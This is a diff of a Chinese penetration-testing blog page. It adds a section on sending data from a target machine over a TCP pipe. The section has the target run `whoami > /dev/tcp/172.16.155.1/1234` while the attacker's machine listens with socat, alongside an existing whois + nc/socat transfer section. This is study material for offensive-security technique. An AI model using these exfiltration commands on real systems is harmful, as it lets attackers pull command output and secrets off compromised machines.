@@ -89,7 +89,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用whois-nc-socat-传输文件"><span class="toc-text">使用whois + nc/socat 传输文件</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用whois-nc-socat-传输文件"><span class="toc-text">使用whois + nc/socat 传输文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用tcp管道传输"><span class="toc-text">使用tcp管道传输</span></a></li></ol>
 </div>
     
 </div>
@@ -141,6 +141,8 @@
 <p><img src="/img/media/15517529128113.jpg" alt=""></p>
 <p>攻击机执行<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-<span class="built_in">listen</span>:<span class="number">1234</span> -</span><br></pre></td></tr></table></figure></p>
 <p><img src="/img/media/15517529662414.jpg" alt=""></p>
+<h2 id="使用tcp管道传输"><a href="#使用tcp管道传输" class="headerlink" title="使用tcp管道传输"></a>使用tcp管道传输</h2><p>目标机执行<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &gt; /dev/tcp/<span class="number">172.16</span><span class="number">.155</span><span class="number">.1</span>/<span class="number">1234</span></span><br></pre></td></tr></table></figure></p>
+<p>攻击机执行<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-<span class="built_in">listen</span>:<span class="number">1234</span> -</span><br></pre></td></tr></table></figure></p>
 
         
             <div class="donate-container">
